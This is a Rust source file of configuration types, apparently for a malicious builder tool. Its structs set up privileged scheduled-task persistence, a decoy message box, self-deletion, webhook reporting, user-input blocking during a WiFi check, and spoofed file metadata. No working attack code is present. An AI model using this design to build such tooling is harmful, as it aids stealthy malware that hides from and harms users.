use std::collections::HashSet;

// keep active config
pub struct KeepActiveConfig {
    pub enabled: bool,
    pub interval_seconds: u64,
}

// wifi monitor config
pub struct WifiMonitorConfig {
    pub enabled: bool,
    pub check_interval_ms: u64,
    pub re_enable_delay_seconds: u64,
    pub block_user_input: bool,
}

// startup config
pub struct StartupConfig {
    pub enabled: bool,
    pub task_name: String,
    pub on_logon: bool,
    pub highest_privileges: bool,
}

// auto delete config
pub struct AutoDeleteConfig {
    pub enabled: bool,
    pub delay_ms: u64,
}

// message box icons
#[allow(dead_code)]
pub enum MessageBoxIcon {
    Error,
    Warning,
    Info,
    Question,
}

// message box buttons
#[allow(dead_code)]
pub enum MessageBoxButtons {
    Ok,
    OkCancel,
    YesNo,
}

// decoy config
pub struct DecoyConfig {
    pub enabled: bool,
    pub title: String,
    pub message: String,
    pub icon: MessageBoxIcon,
    pub buttons: MessageBoxButtons,
}

// webhook report config
pub struct WebhookConfig {
    pub enabled: bool,
    pub url: String,
}

// build info
#[allow(dead_code)]
pub struct BuildInfo {
    pub file_name: String,
    pub product_name: String,
    pub description: String,
    pub company_name: String,
    pub file_version: String,
}

// auth config (remove later)
#[derive(Debug, Clone)]
pub struct AuthConfig {
    pub auth_roles: bool,
    pub allowed_roles: HashSet<String>,
    pub auth_user: bool,
    pub allowed_users: HashSet<String>,
    pub auth_all: bool,
}

impl Default for AuthConfig {
    fn default() -> Self {
        Self {
            auth_roles: false,
            allowed_roles: HashSet::new(),
            auth_user: false,
            allowed_users: HashSet::new(),
            auth_all: true,
        }
    }
}
